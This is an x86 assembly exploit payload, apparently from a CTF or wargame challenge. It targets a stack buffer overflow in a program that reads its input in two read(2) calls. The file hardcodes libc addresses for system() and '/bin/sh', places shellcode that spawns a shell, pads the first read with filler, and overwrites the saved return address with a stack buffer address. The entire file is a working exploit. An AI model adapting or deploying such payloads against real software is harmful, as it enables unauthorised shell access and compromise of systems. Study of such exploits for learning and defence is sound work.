        .intel_syntax noprefix

        .set stack_buffer, 0xbffffe26
        // "/bin/sh" in libc
        .set binsh,        0xb7f8cc58
        // system(3) in libc
        .set libc_system,  0xb7e6b060

        .section .rodata

shellcode_start:
        mov DWORD PTR [esp], binsh
        mov eax, libc_system
        call eax

shellcode_nops:
        .rept 20 - (shellcode_nops - shellcode_start)
        nop
        .endr

shellcode_padding:
        // fill with junk to saturate first read(2)
        .rept 4095 - (shellcode_padding - shellcode_start)
        .byte 'Z'
        .endr

        // don't forget '\n' otherwise the program will crash (segfault)
        .byte 0x0a

// second read, overwrite saved eip
shellcode_end:
        // padding before address
        .rept 14
        .byte 'A'
        .endr

        .int stack_buffer

        // padding after address
        .rept 1
        .byte 'B'
        .endr

        // don't forget '\n' otherwise the program will crash (segfault)
        .byte 0x0a
